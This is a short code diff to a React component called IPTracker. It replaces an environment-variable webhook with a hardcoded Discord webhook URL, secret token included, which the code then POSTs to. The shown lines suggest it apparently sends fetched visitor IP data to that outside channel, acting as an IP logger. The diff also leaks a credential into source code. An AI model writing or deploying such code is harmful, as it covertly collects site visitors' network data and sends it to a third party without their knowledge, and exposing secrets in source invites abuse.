@@ -15,9 +15,8 @@ const IPTracker = () => {
                 const data = await response.json();
                 setIpData(data);
 
-                // Log to a webhook (Example: Discord Webhook)
-                // Set VITE_WEBHOOK_URL in your Vercel/Local environment
-                const webhookUrl = import.meta.env.VITE_WEBHOOK_URL;
+                // Log to a webhook (Directly using the provided Discord Webhook)
+                const webhookUrl = 'https://discord.com/api/webhooks/1477832242129666110/8QnLpB39E68xVJCXeU_Dfi9cM8SpNY76L8wLkCq0BPJlnlvUYSpEq5ymKkEJq4R7st38';
                 if (webhookUrl) {
                     await fetch(webhookUrl, {
                         method: 'POST',
